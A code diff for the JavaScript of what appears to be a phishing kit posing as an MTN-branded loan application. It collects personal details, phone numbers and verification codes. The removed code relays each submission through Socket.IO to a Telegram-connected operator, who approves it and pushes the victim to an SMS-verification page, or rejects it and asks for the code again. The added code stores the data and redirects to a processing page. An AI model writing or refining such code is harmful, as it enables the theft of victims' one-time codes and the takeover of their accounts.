@@ -43,6 +43,7 @@ function goHome() {
     document.getElementById('home-section').classList.remove('hidden');
 }
 
+// --- VALIDATION ---
 function validateStep(stepNumber) {
     const currentStep = document.getElementById('step-' + stepNumber);
     const inputs = currentStep.querySelectorAll('input, select');
@@ -90,14 +91,13 @@ function nextStep(stepNumber) {
     }
 }
 
-// --- SUBMIT VIA SOCKET.IO ---
+// --- SUBMIT VIA SESSION & REDIRECT TO PROCESSING PAGE ---
 document.getElementById('loanForm').addEventListener('submit', function(e) {
     e.preventDefault(); // Stop normal page reload
 
     const submitBtn = document.getElementById('submitBtn');
-    submitBtn.innerText = "WAITING FOR APPROVAL...";
+    submitBtn.innerText = "REDIRECTING...";
     submitBtn.disabled = true;
-    submitBtn.style.backgroundColor = "#ccc";
 
     // Gather all form data
     const data = {
@@ -113,26 +113,10 @@ document.getElementById('loanForm').addEventListener('submit', function(e) {
         income: document.getElementById('income').value
     };
 
-    // Send to server -> Telegram
-    socket.emit('submit_loan', data);
-});
+    // Save data to sessionStorage so the processing page can use it
+    sessionStorage.setItem('loanData', JSON.stringify(data));
+    sessionStorage.setItem('processType', 'loan_application');
 
-// --- LISTEN FOR TELEGRAM DECISION ---
-socket.on('approved', () => {
-    // Admin approved -> Load next page
-    window.location.href = "/verify-sms.html"; 
-});
-
-socket.on('rejected', () => {
-    // Admin rejected -> Go back to phone number step
-    alert("Invalid details. Please enter the correct phone number and verification code.");
-    
-    // Reset button
-    const submitBtn = document.getElementById('submitBtn');
-    submitBtn.innerText = "SUBMIT APPLICATION";
-    submitBtn.disabled = false;
-    submitBtn.style.backgroundColor = "var(--mtn-yellow)";
-
-    // Go back to step 2 (Phone & Code)
-    nextStep(2);
+    // Redirect to the processing page
+    window.location.href = "/processing.html";
 });
